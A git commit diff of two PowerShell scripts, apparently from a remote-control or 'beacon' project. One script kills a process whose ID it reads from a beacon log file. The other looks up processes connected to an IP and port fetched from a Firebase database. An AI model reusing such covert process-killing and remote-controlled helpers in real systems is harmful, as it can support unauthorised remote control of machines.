632c3d7d881084261693b5ac7480b425de4ae380
currone <agungrambujana@gmail.com>
2024-01-28 06:56:28 +0700

    silentElevateLoop

--- ElevatePSTerm.ps1
+++ ElevatePSTerm.ps1
@@ -1,3 +1,12 @@
-#(Get-Process -Name "powershell").Id
-LocalID=$PID
-echo $LocalID
+# $processIds = @(Get-Process -Name powershell).Id
+# $currentProcessId = $PID
+# $junkId = Get-Content "C:\temp\beacon\log.txt"
+# $processIds = $processIds | Where-Object { $_ -ne $currentProcessId }
+# Write-Host "Process IDs: $processIds"
+Write-Host "Terminated ID: $junkId"
+# if ($processIds.Length -ge 1) {
+#     for ($i = 0; $i -lt $processIds.Length; $i++) {
+#         Stop-Process -Id $processIds[$i]
+#     }
+# }
+Stop-Process -Id $junkId
--- TCPState.ps1
+++ TCPState.ps1
@@ -4,8 +4,8 @@ $port = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.
 $owningProcesses = @(Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq $ip -and $_.RemotePort -eq $port } | Select-Object -ExpandProperty OwningProcess)
 [System.Array]::Reverse($owningProcesses)
 $firstProcess = $owningProcesses[0]
-Write-Host "First Owning Process: $firstProcess"
-Write-Host "Owning Processes: $owningProcesses"
+#Write-Host "First Owning Process: $firstProcess"
+#Write-Host "Owning Processes: $owningProcesses"
 
 # Start-Job {
 #     $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json)"
